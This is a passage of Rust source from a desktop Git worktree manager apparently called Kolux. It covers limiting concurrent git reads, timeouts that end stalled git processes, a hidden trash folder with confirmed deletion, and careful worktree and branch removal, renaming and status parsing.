    state: std::sync::Mutex<std::collections::BTreeMap<PathBuf, (usize, usize)>>,
    freed: std::sync::Condvar,
}

pub(crate) struct Turn<'a>(&'a Limiter, PathBuf);

impl Drop for Turn<'_> {
    fn drop(&mut self) {
        let mut s = self.0.state.lock().unwrap_or_else(|e| e.into_inner());
        if let Some(e) = s.get_mut(&self.1) {
            // A turn is dropped once, but a poisoned map or a future refactor must never take the
            // process down through a release-mode underflow (`panic = "abort"`).
            e.0 = e.0.saturating_sub(1);
            if *e == (0, 0) {
                s.remove(&self.1);
            }
        }
        self.0.freed.notify_all();
    }
}

impl Limiter {
    pub(crate) const fn new(at_once: usize) -> Self {
        Limiter { at_once, state: std::sync::Mutex::new(std::collections::BTreeMap::new()), freed: std::sync::Condvar::new() }
    }

    pub(crate) fn enter(&self, worktree: &Path, foreground: bool) -> Turn<'_> {
        let key = worktree.to_path_buf();
        let mut s = self.state.lock().unwrap_or_else(|e| e.into_inner());
        s.entry(key.clone()).or_default().1 += usize::from(foreground);
        loop {
            // A background caller is not counted while it waits, so its entry may have gone.
            let (running, waiting) = *s.entry(key.clone()).or_default();
            if running < self.at_once && (foreground || waiting == 0) {
                break;
            }
            s = self.freed.wait(s).unwrap_or_else(|e| e.into_inner());
        }
        // The entry is created above, but `entry` keeps this panic-free if it ever is not.
        let e = s.entry(key.clone()).or_default();
        e.0 += 1;
        if foreground {
            e.1 = e.1.saturating_sub(1);
            self.freed.notify_all();
        }
        Turn(self, key)
    }

    #[cfg(test)]
    pub(crate) fn running(&self, worktree: &Path) -> usize {
        self.state.lock().unwrap().get(worktree).map_or(0, |e| e.0)
    }
}

static LIMITER: Limiter = Limiter::new(READS_PER_WORKTREE);

thread_local! {
    static FOREGROUND: std::cell::Cell<bool> = const { std::cell::Cell::new(false) };
}

/// GIT-070: runs `read` with its short git reads counted as foreground work.
pub(crate) fn foreground<T>(read: impl FnOnce() -> T) -> T {
    let was = FOREGROUND.replace(true);
    let out = read();
    FOREGROUND.set(was);
    out
}

/// GIT-070, for tests: whether this thread's short reads are counted as foreground work.
#[cfg(test)]
pub(crate) fn foreground_lane() -> bool {
    FOREGROUND.get()
}

/// Runs git and returns its stdout byte for byte; a non-zero exit becomes an error carrying stderr.
/// GIT-070: a short read waits for its worktree's turn and is stopped at `SHORT_READ_LIMIT`.
pub(crate) fn output(args: &[&str], cwd: Option<&Path>) -> Result<Vec<u8>, String> {
    gated(args, cwd, &LIMITER, SHORT_READ_LIMIT)
}

fn gated(args: &[&str], cwd: Option<&Path>, limiter: &Limiter, limit: std::time::Duration) -> Result<Vec<u8>, String> {
    if !short_read(args) {
        return plain_output(args, cwd);
    }
    let _turn = cwd.map(|d| limiter.enter(d, FOREGROUND.get()));
    bytes_within(args, cwd, limit)
}

/// git with no turn and no time limit: the long-running and writing commands.
fn plain_output(args: &[&str], cwd: Option<&Path>) -> Result<Vec<u8>, String> {
    let _changed = WorktreeChange::watch(args);
    let out = command_checked(args, cwd)?.output().map_err(|e| format!("could not run git: {e}"))?;
    if out.status.success() {
        Ok(out.stdout)
    } else {
        let err = String::from_utf8_lossy(&out.stderr).trim().to_string();
        Err(if err.is_empty() { format!("git {} failed ({})", args.join(" "), out.status) } else { err })
    }
}

/// PROJ-072: Git's complaint about a Windows path past its length limit.
pub(crate) fn path_too_long(err: &str) -> bool {
    let t = err.to_lowercase();
    t.contains("filename too long") || t.contains("path too long") || t.contains("file name too long")
}

/// PROJ-072: the form of `p` that Windows accepts past 260 characters (`\?\` in front); unchanged elsewhere.
pub(crate) fn long_path(p: &Path) -> PathBuf {
    #[cfg(windows)]
    {
        let s = p.to_string_lossy();
        if p.is_absolute() && !s.starts_with(r"\\?\") {
            return PathBuf::from(format!(r"\\?\{}", s.replace('/', r"\")));
        }
    }
    p.to_path_buf()
}

/// PROJ-074: the name every trash folder starts with (hidden by the leading dot, and on Windows
/// by the hidden attribute). After-list row 130: only the exact `.kolux-trash-<hex>-<hex>-<name>`
/// shape `move_to_trash` makes counts; the older forms are left alone.
pub(crate) const TRASH_PREFIX: &str = ".kolux-trash-";

/// After-list rows 127/128: the file a trash folder carries once its removal is confirmed (Git's
/// record of the worktree is gone and Git's list agrees). The launch sweep deletes only folders
/// that carry it. A folder without it (a move back that failed, a removal that stopped half way,
/// a run that ended mid-removal, a folder from an older build) may hold work the user still
/// needs, so it is kept and named in the diagnostics log instead.
pub(crate) const TRASH_CONFIRMED: &str = ".kolux-trash-confirmed";

pub(crate) fn is_trash_name(name: &str) -> bool {
    let Some(rest) = name.strip_prefix(TRASH_PREFIX) else { return false };
    let mut parts = rest.splitn(3, '-');
    let hex = |s: Option<&str>| s.is_some_and(|s| !s.is_empty() && s.chars().all(|c| c.is_ascii_hexdigit()));
    hex(parts.next()) && hex(parts.next()) && parts.next().is_some_and(|n| !n.is_empty())
}

/// Rows 127/128: marks a trash folder as confirmed for deletion (see `TRASH_CONFIRMED`). Only a
/// real folder is marked, never through a link.
pub(crate) fn confirm_trash(trash: &Path) {
    if std::fs::symlink_metadata(trash).is_ok_and(|m| m.is_dir()) {
        let _ = std::fs::write(long_path(&trash.join(TRASH_CONFIRMED)), b"removal confirmed; Kolux deletes this folder\n");
    }
}

fn trash_confirmed(trash: &Path) -> bool {
    std::fs::symlink_metadata(trash.join(TRASH_CONFIRMED)).is_ok_and(|m| m.is_file())
}

/// PROJ-074: moves `dest` into a hidden trash folder beside it (same volume, so it is one rename
/// and the row can vanish at once). Fails, leaving `dest` where it was, when Windows will not
/// let go of the folder (see `move_to_trash_patiently`).
pub(crate) fn move_to_trash(dest: &Path) -> Result<PathBuf, String> {
    use std::sync::atomic::{AtomicU32, Ordering};
    static COUNTER: AtomicU32 = AtomicU32::new(0);
    let parent = dest.parent().ok_or_else(|| format!("{} has no parent folder", dest.display()))?;
    let name = dest.file_name().ok_or_else(|| format!("{} has no name", dest.display()))?.to_string_lossy().into_owned();
    let nonce = format!("{:x}-{:x}", std::process::id(), COUNTER.fetch_add(1, Ordering::Relaxed));
    let trash = parent.join(format!("{TRASH_PREFIX}{nonce}-{name}"));
    std::fs::rename(long_path(dest), long_path(&trash)).map_err(|e| format!("{} could not be moved to the trash: {e}", dest.display()))?;
    hide_folder(&trash);
    Ok(trash)
}

/// Row 110: a folder with a file held open cannot be renamed, and Windows lets go a moment after
/// the program ends, so it gets a few more tries. Still held, the removal is refused here with
/// nothing touched: `git worktree remove` would drop Git's record and delete part of the folder
/// before it failed on the held file.
fn move_to_trash_patiently(dest: &Path) -> Result<PathBuf, String> {
    let mut last = String::new();
    for attempt in 0..4 {
        match move_to_trash(dest) {
            Ok(trash) => return Ok(trash),
            Err(e) => last = e,
        }
        if attempt < 3 {
            std::thread::sleep(std::time::Duration::from_millis(250));
        }
    }
    Err(format!("{last}; nothing was deleted: close the programs that have files open in the folder and try again"))
}

/// PROJ-074: the undo of `move_to_trash`: the folder goes back to where Git expects it. A folder
/// a program holds for a moment gets a few more tries. After-list row 128: when it still will not
/// move, it stays in the trash untouched (unconfirmed, so the launch sweep keeps it) and the error
/// says where it is.
pub(crate) fn move_back(trash: &Path, dest: &Path) -> Result<(), String> {
    let mut last = String::new();
    for attempt in 0..4 {
        match std::fs::rename(long_path(trash), long_path(dest)) {
            Ok(()) => return Ok(()),
            Err(e) => last = e.to_string(),
        }
        if attempt < 3 {
            std::thread::sleep(std::time::Duration::from_millis(250));
        }
    }
    Err(format!("{} could not be moved back from the trash ({last}); nothing was deleted: the folder is kept as it was at {}", dest.display(), trash.display()))
}

#[cfg(windows)]
fn hide_folder(p: &Path) {
    use std::os::windows::process::CommandExt;
    let _ = std::process::Command::new("attrib").arg("+h").arg(p).creation_flags(0x0800_0000).output();
}
#[cfg(not(windows))]
fn hide_folder(_: &Path) {}

/// Deletes a trash folder; files a program still held open get a few more tries. A symlink is
/// unlinked, never followed.
pub(crate) fn empty_trash(trash: &Path) -> bool {
    let is_link = std::fs::symlink_metadata(trash).is_ok_and(|m| m.file_type().is_symlink());
    for _ in 0..4 {
        let done = if is_link { std::fs::remove_file(trash).or_else(|_| std::fs::remove_dir(trash)).is_ok() } else { clear_confirmed_last(trash) };
        if done || !trash.exists() {
            return true;
        }
        std::thread::sleep(std::time::Duration::from_millis(250));
    }
    false
}

/// Rows 127/128: everything in the folder goes before its confirmation mark, so a delete cut short
/// (the app quit, a file held open) leaves a folder the next launch sweep still recognises.
fn clear_confirmed_last(trash: &Path) -> bool {
    if let Ok(entries) = std::fs::read_dir(long_path(trash)) {
        for e in entries.flatten() {
            if e.file_name() == TRASH_CONFIRMED {
                continue;
            }
            let p = e.path();
            let _ = if e.file_type().is_ok_and(|t| t.is_dir()) { std::fs::remove_dir_all(&p) } else { std::fs::remove_file(&p).or_else(|_| std::fs::remove_dir(&p)) };
        }
    }
    std::fs::remove_dir_all(long_path(trash)).is_ok()
}

/// PROJ-074: the deleting happens off the caller's thread; the space returns shortly after.
pub(crate) fn empty_trash_in_background(trash: PathBuf) {
    if cfg!(test) {
        // Unit tests delete their own temp folders right after; a second deleter would race them.
        empty_trash(&trash);
    } else {
        spawn_empty_trash(trash);
    }
}

fn spawn_empty_trash(trash: PathBuf) -> std::thread::JoinHandle<bool> {
    std::thread::spawn(move || empty_trash(&trash))
}

/// After-list row 129: deletes `refs/heads/<branch>` in one compare-and-delete step that Git
/// refuses when the branch no longer points at `commit` (it moved after the check). Ok(false)
/// means it was left alone.
pub(crate) fn delete_ref_if_at(repo: &Path, branch: &str, commit: &str) -> Result<bool, String> {
    if commit.is_empty() || !commit.chars().all(|c| c.is_ascii_hexdigit()) || branch.starts_with('-') {
        return Ok(false);
    }
    let reference = format!("refs/heads/{branch}");
    match run(&["update-ref", "-d", &reference, commit], Some(repo)) {
        Ok(_) => Ok(true),
        Err(e) => match run(&["rev-parse", "--verify", "--quiet", &reference], Some(repo)) {
            // still there, now somewhere else: it moved, so it stays
            Ok(at) if at != commit => Ok(false),
            _ => Err(e),
        },
    }
}

/// What one launch sweep did in one folder.
#[derive(Debug, Default)]
pub(crate) struct Swept {
    /// Trash folders deleted (confirmed ones, and links, which hold nothing themselves).
    pub gone: Vec<PathBuf>,
    /// Trash folders kept because their removal was never confirmed (rows 127/128).
    pub kept: Vec<PathBuf>,
}

/// PROJ-074: deletes every confirmed trash folder directly inside `parent` (left by a run that
/// ended before the background pass finished). Only names that `is_trash_name` accepts are
/// touched, and never a file. After-list row 128: a trash folder without the confirmation mark (a
/// failed move back, a removal cut short) is never deleted; it is reported as kept.
pub(crate) fn sweep_trash(parent: &Path) -> Swept {
    let mut swept = Swept::default();
    let Ok(entries) = std::fs::read_dir(parent) else { return swept };
    for e in entries.flatten() {
        let name = e.file_name().to_string_lossy().into_owned();
        let Ok(kind) = e.file_type() else { continue };
        if !is_trash_name(&name) || !(kind.is_dir() || kind.is_symlink()) {
            continue;
        }
        if kind.is_dir() && !trash_confirmed(&e.path()) {
            swept.kept.push(e.path());
        } else if empty_trash(&e.path()) {
            swept.gone.push(e.path());
        }
    }
    swept
}

/// PROJ-027: how long a worktree add may take before Kolux stops waiting. Cloud-synced folders
/// can stall git for minutes; the default is 3 minutes. COMPAT: `KOLUX_WORKTREE_ADD_TIMEOUT_MS`
/// (milliseconds) overrides it, clamped to 3 to 30 minutes; anything unreadable keeps the default.
pub(crate) fn add_timeout(env: Option<&str>) -> std::time::Duration {
    const MIN: u64 = 3 * 60_000;
    const MAX: u64 = 30 * 60_000;
    std::time::Duration::from_millis(env.and_then(|v| v.trim().parse::<u64>().ok()).map_or(MIN, |ms| ms.clamp(MIN, MAX)))
}

/// PROJ-027: the wait for reads that precede a removal or a listing (status, worktree list).
pub(crate) const READ_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(30);

/// `run` with a deadline. On timeout the git process and its children are ended and the error
/// names the wait and the usual cause (a folder a cloud service is syncing).
pub(crate) fn run_within(args: &[&str], cwd: Option<&Path>, limit: std::time::Duration) -> Result<String, String> {
    run_within_raw(args, cwd, limit).map(|s| s.trim().to_string())
}

/// run_within keeping leading spaces (status lines).
fn run_within_raw(args: &[&str], cwd: Option<&Path>, limit: std::time::Duration) -> Result<String, String> {
    bytes_within(args, cwd, limit).map(|b| String::from_utf8_lossy(&b).to_string())
}

/// git with a deadline, stdout byte for byte. Past the deadline git and every process it started
/// are ended (GIT-070: the whole tree, not just git) and the error names the wait.
fn bytes_within(args: &[&str], cwd: Option<&Path>, limit: std::time::Duration) -> Result<Vec<u8>, String> {
    use std::io::Read;
    use std::process::Stdio;
    let _changed = WorktreeChange::watch(args);
    let mut child = command_checked(args, cwd)?.stdin(Stdio::null()).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn().map_err(|e| format!("could not run git: {e}"))?;
    let drain = |mut r: Box<dyn Read + Send>| {
        let (tx, rx) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            let mut buf = Vec::new();
            let _ = r.read_to_end(&mut buf);
            let _ = tx.send(buf);
        });
        rx
    };
    let out = drain(Box::new(child.stdout.take().expect("piped")));
    let err = drain(Box::new(child.stderr.take().expect("piped")));
    let deadline = std::time::Instant::now() + limit;
    let stopped = |child: &mut std::process::Child| {
        crate::procs::kill_tree(child.id());
        let _ = child.kill();
        let _ = child.wait();
        Err(format!(
            "Git did not finish in {} seconds, so Kolux stopped waiting. A folder that a cloud service (OneDrive, Dropbox, iCloud) is syncing is the usual cause: move the project or the workspaces folder outside it.",
            limit.as_secs()
        ))
    };
    // Waiting on the end of stdout, not polling, keeps a quick read quick.
    let Ok(out) = out.recv_timeout(limit) else { return stopped(&mut child) };
    let status = loop {
        match child.try_wait() {
            Ok(Some(s)) => break s,
            Ok(None) if std::time::Instant::now() >= deadline => return stopped(&mut child),
            Ok(None) => std::thread::sleep(std::time::Duration::from_millis(2)),
            Err(e) => return Err(format!("could not wait for git: {e}")),
        }
    };
    let err = err.recv_timeout(deadline.saturating_duration_since(std::time::Instant::now())).unwrap_or_default();
    if status.success() {
        Ok(out)
    } else {
        let err = String::from_utf8_lossy(&err).trim().to_string();
        Err(if err.is_empty() { format!("git {} failed ({status})", args.join(" ")) } else { err })
    }
}

/// Runs git and returns its stdout, trimmed; a non-zero exit becomes an error carrying stderr.
pub(crate) fn run(args: &[&str], cwd: Option<&Path>) -> Result<String, String> {
    run_untrimmed(args, cwd).map(|s| s.trim().to_string())
}

/// `run` keeping leading spaces, which `git status --porcelain` lines carry meaning in.
pub(crate) fn run_untrimmed(args: &[&str], cwd: Option<&Path>) -> Result<String, String> {
    output(args, cwd).map(|o| String::from_utf8_lossy(&o).to_string())
}

/// GIT-062: the one readable line a failed git's stderr comes down to. The last `fatal:` line
/// wins, then the last `error:` line, then the last line that is not progress; None when only
/// progress was said. A `\r`-overwritten line counts as its last state.
pub fn failure_reason(log: &str) -> Option<String> {
    const PROGRESS: [&str; 9] = ["Cloning into", "remote: ", "Receiving objects", "Resolving deltas", "Updating files", "Checking out files", "Filtering content", "Enumerating objects", "Counting objects"];
    // A line's last state is its last non-empty \r segment, so a line git ends with \r still counts.
    let lines: Vec<&str> = log.lines().filter_map(|l| l.rsplit('\r').map(str::trim).find(|s| !s.is_empty())).collect();
    let tagged = |tag: &str| lines.iter().rev().find_map(|l| l.strip_prefix(tag)).map(str::trim);
    let line = tagged("fatal:").or_else(|| tagged("error:")).or_else(|| lines.iter().rev().copied().find(|l| !PROGRESS.iter().any(|p| l.starts_with(p))))?;
    let line = hide_userinfo(line);
    let mut chars = line.chars();
    chars.next().map(|first| first.to_uppercase().chain(chars).collect())
}

/// FIX-2: `scheme://user:token@host` becomes `scheme://***@host`, so a reason never shows a
/// password or token that was in a link.
fn hide_userinfo(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    let mut rest = text;
    while let Some(at) = rest.find("://") {
        let (head, tail) = rest.split_at(at + 3);
        out.push_str(head);
        let authority_end = tail.find(|c: char| c == '/' || c.is_whitespace() || c == '\'' || c == '"').unwrap_or(tail.len());
        match tail[..authority_end].rfind('@') {
            Some(user_end) => {
                out.push_str("***");
                rest = &tail[user_end..];
            }
            None => rest = tail,
        }
    }
    out.push_str(rest);
    out
}

/// One changed file on one side of the index (EDIT-027): `code` is git's status letter.
#[derive(Clone, Debug, PartialEq, Eq, serde::Serialize)]
pub struct Change {
    pub path: String,
    pub staged: bool,
    pub code: char,
}

/// Parses `git status --porcelain=v1 -z`. A file with staged and unstaged changes gives two
/// entries; an untracked file is an unstaged one with code `?`.
pub fn parse_status(text: &str, worktree: &Path) -> Vec<Change> {
    let mut list = Vec::new();
    let mut parts = text.split('\0');
    while let Some(entry) = parts.next() {
        let b = entry.as_bytes();
        if b.len() < 4 {
            continue;
        }
        let (x, y) = (b[0] as char, b[1] as char);
        if x == 'R' || x == 'C' {
            parts.next(); // the old name follows a rename or a copy
        }
        let path = worktree.join(native(&entry[3..])).to_string_lossy().into_owned();
        if !matches!(x, ' ' | '?' | '!') {
            list.push(Change { path: path.clone(), staged: true, code: x });
        }
        if !matches!(y, ' ' | '!') {
            list.push(Change { path, staged: false, code: y });
        }
    }
    list
}

/// Git's own path spelling (forward slashes, no `\\?\` prefix) turned back into a native path.
pub(crate) fn native(path: &str) -> String {
    if cfg!(windows) {
        path.replace('/', "\\")
    } else {
        path.to_string()
    }
}

impl Git {
    /// GIT-068: predicting a merge needs `git merge-tree --write-tree`, new in Git 2.38. Read from
    /// the version found once at startup, so an older Git is never probed for it again; a version
    /// that cannot be read is tried.
    pub fn predicts_merges(&self) -> bool {
        let mut n = self.version.trim_start_matches("git version ").split('.').map(|x| x.parse::<u32>().ok());
        match (n.next().flatten(), n.next().flatten()) {
            (Some(major), Some(minor)) => (major, minor) >= (2, 38),
            _ => true,
        }
    }

    /// Finds git on the path. Called once at startup; the version is shown to the user.
    pub fn detect() -> Result<Git, String> {
        let version = run(&["--version"], None).map_err(|e| format!("Git is not available: {e}"))?;
        Ok(Git { version })
    }

    /// The top-level folder of the repository that holds `path`, or an error if there is none.
    pub fn toplevel(&self, path: &Path) -> Result<PathBuf, String> {
        if !path.is_dir() {
            return Err(format!("{} is not a folder", path.display()));
        }
        // Someone who picks the .git folder itself meant the repository around it.
        let path = if path.file_name().is_some_and(|n| n == ".git") { path.parent().unwrap_or(path) } else { path };
        let top = run(&["rev-parse", "--show-toplevel"], Some(path))
            .map_err(|_| format!("{} is not inside a Git repository", path.display()))?;
        Ok(PathBuf::from(native(&top)))
    }

    pub fn worktrees(&self, repo: &Path) -> Result<Vec<Worktree>, String> {
        let text = run_within(&["worktree", "list", "--porcelain"], Some(repo), READ_TIMEOUT)?;
        Ok(parse_worktrees(&text))
    }

    /// `git worktree add -b <branch> <dest> <base>`: a new branch in a folder of its own.
    pub fn worktree_add(&self, repo: &Path, dest: &Path, branch: &str, base: &str) -> Result<(), String> {
        let dest = dest.to_string_lossy();
        let limit = add_timeout(std::env::var("KOLUX_WORKTREE_ADD_TIMEOUT_MS").ok().as_deref());
        run_within(&["worktree", "add", "-b", branch, &dest, base], Some(repo), limit).map(|_| ())
    }

    /// Removes the worktree folder and then deletes its branch. The folder goes first; a branch
    /// that will not delete (never the case for `-D`) leaves a clear error rather than a half state.
    /// A branch another worktree still has checked out is kept: the result then carries the
    /// commit it points at, for `delete_branch_if_at` later.
    ///
    /// PROJ-072: a folder already gone while Git still lists it is cleaned up (Git's own record
    /// for it goes, never anything else); a Windows path too long for Git is deleted locally and
    /// its record dropped; a folder left behind after Git let go of it is deleted too. A
    /// registration Git still reports afterwards is an error, never forced out from under it.
    pub fn worktree_remove(&self, repo: &Path, dest: &Path, branch: Option<&str>) -> Result<Option<String>, String> {
        // The normal path runs no `git worktree` command, so every finish (done, held, restored) counts here.
        let _changed = WorktreeChange(true);
        let dest_s = dest.to_string_lossy();
        // PROJ-074: the folder is moved into a hidden trash beside it first and Git's record for
        // it dropped, so the workspace is gone at once; the slow delete happens in the background.
        // After-list row 127: Git's record is only set aside until the removal is confirmed, so an
        // undo puts back both the folder and the record.
        let mut trashed: Option<(PathBuf, crate::projects::SetAside)> = None;
        if !dest.exists() {
            let _ = crate::projects::forget_record(repo, &dest_s);
        } else {
            let trash = move_to_trash_patiently(dest)?;
            match crate::projects::set_aside_record(repo, &dest_s) {
                Ok(record) => trashed = Some((trash, record)),
                // Git's record could not be dropped (a lock, say): the folder goes back and the
                // ordinary removal below runs and gives its own answer. Should the folder not
                // move back, it stays unconfirmed in the trash, which the launch sweep keeps.
                Err(_) => move_back(&trash, dest)?,
            }
        }
        if trashed.is_none() && dest.exists() {
            // Windows may still hold the folder for a moment after a program in it was ended.
            let mut attempt = 0;
            loop {
                match run(&["worktree", "remove", "--force", &dest_s], Some(repo)) {
                    Ok(_) => break,
                    Err(e) if attempt < 5 && e.contains("Permission denied") => {
                        attempt += 1;
                        std::thread::sleep(std::time::Duration::from_millis(250));
                    }
                    Err(e) if path_too_long(&e) => {
                        std::fs::remove_dir_all(long_path(dest)).map_err(|err| format!("{e}; deleting the folder directly failed too: {err}"))?;
                        let _ = crate::projects::forget_record(repo, &dest_s);
                        break;
                    }
                    Err(e) => return Err(e),
                }
            }
        }
        let key = crate::projects::name_key(&dest_s);
        // A listing Git cannot give counts as "still listed": the removal is undone, never left half way.
        let listed = self.worktrees(repo).map(|all| all.iter().any(|w| crate::projects::name_key(&w.path) == key));
        if listed != Ok(false) {
            if let Some((trash, record)) = &trashed {
                // The removal is undone: Git's record and then the folder go back where they were.
                let restored = record.restore();
                move_back(trash, dest)?;
                restored?;
            }
            return Err(listed.err().unwrap_or_else(|| format!("Git still lists {} as a workspace, so Kolux left its record alone", dest.display())));
        }
        if let Some((trash, record)) = trashed {
            // Confirmed: the record goes for good and the folder is marked for the sweep, which
            // finishes the delete should this run end before the background pass does.
            record.discard();
            confirm_trash(&trash);
            empty_trash_in_background(trash);
        }
        if dest.exists() {
            // What Kolux made and Git let go of: leftovers (files a program held open) go too.
            for _ in 0..4 {
                if std::fs::remove_dir_all(long_path(dest)).is_ok() || !dest.exists() {
                    break;
                }
                std::thread::sleep(std::time::Duration::from_millis(250));
            }
        }
        if dest.exists() {
            return Err(format!("the folder {} is still there: something keeps it open", dest.display()));
        }
        if let Some(b) = branch {
            if self.checked_out_somewhere(repo, b)? {
                return run(&["rev-parse", "--verify", &format!("refs/heads/{b}")], Some(repo)).map(Some);
            }
            run(&["branch", "-D", b], Some(repo))?;
        }
        Ok(None)
    }

    /// `git worktree move`: the folder changes place and Git's own records follow.
    pub fn worktree_move(&self, repo: &Path, from: &Path, to: &Path) -> Result<(), String> {
        run(&["worktree", "move", &from.to_string_lossy(), &to.to_string_lossy()], Some(repo)).map(|_| ())
    }

    /// PROJ-068: `git worktree repair`: Git learns that the worktree now sits in `dir`.
    pub fn worktree_repair(&self, repo: &Path, dir: &Path) -> Result<(), String> {
        run_within(&["worktree", "repair", &dir.to_string_lossy()], Some(repo), SHORT_READ_LIMIT).map(|_| ())
    }

    fn checked_out_somewhere(&self, repo: &Path, branch: &str) -> Result<bool, String> {
        Ok(self.worktrees(repo)?.iter().any(|w| w.branch.as_deref() == Some(branch)))
    }

    /// Deletes a branch kept at removal, but only while it still points at `commit` and no
    /// worktree has it checked out. Ok(false) means it was left alone.
    pub fn delete_branch_if_at(&self, repo: &Path, branch: &str, commit: &str) -> Result<bool, String> {
        let at = run(&["rev-parse", "--verify", "--quiet", &format!("refs/heads/{branch}")], Some(repo))?;
        if at != commit || self.checked_out_somewhere(repo, branch)? {
            return Ok(false);
        }
        delete_ref_if_at(repo, branch, commit)
    }

    /// PROJ-080: when the checkout's HEAD commit was made (seconds since 1970), for "gone quiet".
    pub fn head_time(&self, worktree: &Path) -> Option<u64> {
        run_within(&["log", "-1", "--format=%ct", "HEAD"], Some(worktree), READ_TIMEOUT).ok()?.parse().ok()
    }

    /// PROJ-080: is everything on the checkout's HEAD already in `base`?
    pub fn merged_into(&self, worktree: &Path, base: &str) -> bool {
        Self::ref_ok(base) && run_within(&["merge-base", "--is-ancestor", "HEAD", base], Some(worktree), READ_TIMEOUT).is_ok()
    }

    /// Does `rev` (a branch ref or a commit) hold commits that `base` lacks? Anything that cannot
    /// be read counts as yes, so a doubtful branch is kept rather than deleted.
    pub fn has_unmerged(&self, repo: &Path, rev: &str, base: &str) -> bool {
        !(Self::ref_ok(base) && Self::ref_ok(rev) && run_within(&["merge-base", "--is-ancestor", rev, base], Some(repo), READ_TIMEOUT).is_ok())
    }

    /// PROJ-070: the checkout's uncommitted and untracked changes, one `git status --porcelain` line each.
    pub fn status_lines(&self, worktree: &Path) -> Result<Vec<String>, String> {
        run_within_raw(&["status", "--porcelain"], Some(worktree), READ_TIMEOUT).map(|s| s.lines().filter(|l| !l.is_empty()).map(str::to_string).collect())
    }

    /// Does the checkout hold changes Git does not have yet (modified or untracked files, and
    /// work inside a submodule)?
    pub fn dirty(&self, worktree: &Path) -> Result<bool, String> {
        run_within(&["status", "--porcelain", "--ignore-submodules=none"], Some(worktree), READ_TIMEOUT).map(|s| !s.is_empty())
    }

    /// Could `rev` be a ref spelling at all? Anything git might read as an option or a range is
    /// refused before any command runs.
    pub fn ref_ok(rev: &str) -> bool {
        !rev.is_empty() && !rev.starts_with('-') && !rev.contains("..") && !rev.chars().any(|c| c.is_whitespace() || c.is_control())
    }

    /// How many commits `base` has that the worktree's HEAD does not (ORCH-014's base drift).
    pub fn behind(&self, worktree: &Path, base: &str) -> Option<u32> {
        run(&["rev-list", "--count", &format!("HEAD..{base}")], Some(worktree)).ok()?.parse().ok()
    }

    /// Does `rev` name a commit here: a branch, tag, remote branch or id?
    pub fn rev_exists(&self, repo: &Path, rev: &str) -> bool {
        Self::ref_ok(rev) && run(&["rev-parse", "--verify", "--quiet", &format!("{rev}^{{commit}}")], Some(repo)).is_ok()
    }

    /// The branch new work starts from when nothing says otherwise (PROJ-028): origin's HEAD,
    /// else main or master, else the branch the main checkout is on.
    pub fn default_branch(&self, repo: &Path) -> Option<String> {
        let short = |args: &[&str]| run(args, Some(repo)).ok().filter(|s| !s.is_empty());
        short(&["symbolic-ref", "-q", "--short", "refs/remotes/origin/HEAD"])
            .or_else(|| ["main", "master"].into_iter().find(|b| self.rev_exists(repo, b)).map(String::from))
            .or_else(|| short(&["symbolic-ref", "-q", "--short", "HEAD"]))
    }

    /// Can a workspace start from `rev`? A ref that tracks a remote (`origin/x`, or a local
    /// branch with an upstream) is fetched first so it is fresh, and one the remote no longer
    /// has counts as gone; a full commit id is used as it is; being offline is not an error, the
    /// local copy serves.
    pub fn base_available(&self, repo: &Path, rev: &str) -> bool {
        if !Self::ref_ok(rev) {
            return false;
        }
        if rev.len() == 40 && rev.bytes().all(|b| b.is_ascii_hexdigit()) {
            return self.rev_exists(repo, rev);
        }
        let full = |r: &str| run(&["rev-parse", "--symbolic-full-name", r], Some(repo)).unwrap_or_default();
        let tracking = Some(full(rev)).filter(|f| f.starts_with("refs/remotes/")).unwrap_or_else(|| full(&format!("{rev}@{{upstream}}")));
        if let Some((remote, branch)) = tracking.strip_prefix("refs/remotes/").and_then(|r| r.split_once('/')) {
            if let Err(e) = run(&["fetch", "--quiet", remote, branch], Some(repo)) {
                if e.contains("couldn't find remote ref") {
                    return false;
                }
            }
        }
        self.rev_exists(repo, rev)
    }

    /// Is the name a local branch, or a branch on any remote (PROJ-021: a taken name gets a number)?
    pub fn branch_taken(&self, repo: &Path, branch: &str) -> bool {
        run(&["for-each-ref", "--format=%(refname)", &format!("refs/heads/{branch}"), &format!("refs/remotes/*/{branch}")], Some(repo)).is_ok_and(|s| !s.is_empty())
    }

    /// GIT-020 / PROJ-039: the upstream `branch` tracks (for example `origin/work`), if any. Read
    /// before a rename so the answer can say what tracking was kept.
    pub fn upstream_of(&self, repo: &Path, branch: &str) -> Option<String> {
        if !Self::ref_ok(branch) {
            return None;
        }
        run(&["for-each-ref", "--format=%(upstream:short)", &format!("refs/heads/{branch}")], Some(repo)).ok().filter(|s| !s.is_empty())
    }

    /// PROJ-039 (T-107-d): whether any remote holds a branch of this name, so a pushed branch is
    /// never renamed from under its remote even when no tracking is configured.
    pub fn on_remote(&self, repo: &Path, branch: &str) -> bool {
        Self::ref_ok(branch) && run(&["for-each-ref", "--format=%(refname)", &format!("refs/remotes/*/{branch}")], Some(repo)).is_ok_and(|s| !s.trim().is_empty())
    }

    /// PROJ-039 (T-107-d): whether `branch` is configured to track a remote (`branch.<name>.remote`),
    /// even when the remote-tracking ref has not been fetched yet, so `upstream_of` says nothing.
    pub fn tracks_remote(&self, repo: &Path, branch: &str) -> bool {
        Self::ref_ok(branch) && run(&["config", "--get", &format!("branch.{branch}.remote")], Some(repo)).is_ok_and(|s| !s.trim().is_empty())
    }

    /// GIT-020: renames the local branch `old` to `new` with `git branch -m`, which keeps the
    /// branch's commits and moves its tracking settings along. It never uses `-M` and deletes
    /// nothing: a name a local branch or a remote already uses is refused here, so the refusal does
    /// not depend on Git's wording.
    pub fn rename_branch(&self, repo: &Path, old: &str, new: &str) -> Result<(), String> {
        if !Self::ref_ok(old) || !Self::ref_ok(new) {
            return Err("That branch name is not usable.".into());
        }
        if old == new {
            return Ok(());
        }
        if self.branch_taken(repo, new) {
            return Err(format!("A branch named {new} already exists, so {old} keeps its name."));
        }
        run(&["branch", "-m", old, new], Some(repo)).map(|_| ())
    }

    /// The worktree's markdown files, tracked and untracked, as full paths (EDIT-012). Git leaves
    /// out ignored files and never walks into a symlinked folder; the list stops at `cap`, and the
    /// flag says it did.
    pub fn markdown_files(&self, worktree: &Path, cap: usize) -> Result<(Vec<String>, bool), String> {
        let text = run(&["ls-files", "-z", "--cached", "--others", "--exclude-standard", "--deduplicate", "--", "*.md", "*.markdown"], Some(worktree))?;
